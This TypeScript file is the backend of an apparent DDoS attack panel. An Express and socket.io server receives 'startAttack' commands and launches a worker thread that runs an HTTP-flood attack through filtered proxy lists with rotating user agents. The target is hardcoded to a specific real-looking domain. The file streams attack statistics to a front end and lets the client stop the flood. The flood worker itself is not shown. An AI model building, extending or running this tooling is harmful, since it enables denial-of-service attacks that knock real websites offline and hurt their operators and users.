import express from "express";
import {createServer} from "http";
import {Server} from "socket.io";
import {Worker} from "worker_threads";
import {join} from "path";
import {AttackMethod, AttackWorker} from "./types";
import {filterProxies} from "./utils/proxy";
import {loadProxies, loadUserAgents} from "./utils/file";

const PORT = process.env.PORT || 3000;
const __prod = process.env.NODE_ENV === "production";

const app = express();


app.get('/', (req, res) => {
    res.send("Backend is alive");
})

const httpServer = createServer(app);
const io = new Server(httpServer, {
    cors: {
        origin: __prod ? "" : "http://localhost:5173",
        methods: ["GET", "POST"],
        allowedHeaders: ["Content-Type"],
    },
});

io.on("connection", (socket) => {
    console.log("Client connected");

    socket.on("startAttack", (params) => {
        // const {target, duration, packetDelay, attackMethod, packetSize} = params;
        const target = 'https://shg2.radolyn.com';
        const filteredProxies = filterProxies(loadProxies(), AttackMethod.HTTPFlood);
        const userAgents = loadUserAgents();
        const duration = 2;
        const packetDelay = 1000;
        const packetSize = 64;

        socket.emit("stats", {
            log: `🍒 Using ${filteredProxies.length} filtered proxies to perform attack.`,
            bots: filteredProxies.length,
        });

        const worker = new Worker(join(__dirname, AttackWorker.HTTPFlood), {
            workerData: {
                target,
                proxies: filteredProxies,
                userAgents,
                duration,
                packetDelay,
                packetSize,
            },
        });

        worker.on("message", (message) => {
            console.log('MESSAGE:', message);
            socket.emit("stats", message)
        });

        worker.on("error", (error) => {
            console.log(error);

            console.error(`Worker error: ${error.message}`);
            socket.emit("stats", {log: `❌ Worker error: ${error.message}`});
        });

        worker.on("exit", (code) => {
            console.log(`Worker exited with code ${code}`);
            socket.emit("attackEnd");
        });


        // @ts-ignore
        socket["worker"] = worker;
    });

    socket.on("stopAttack", () => {
        // @ts-ignore
        const worker = socket["worker"];
        if (worker) {
            worker.terminate();
            socket.emit("attackEnd");
        }
    });

    socket.on("disconnect", () => {
        // @ts-ignore
        const worker = socket["worker"];
        if (worker) {
            worker.terminate();
        }
        console.log("Client disconnected");
    });
})

httpServer.listen(PORT, () => {
    if (__prod) {
        console.log(
            `(Production Mode) Client and server is running under http://localhost:${PORT}`
        );
    } else {
        console.log(`Server is running under development port ${PORT}`);
    }
});
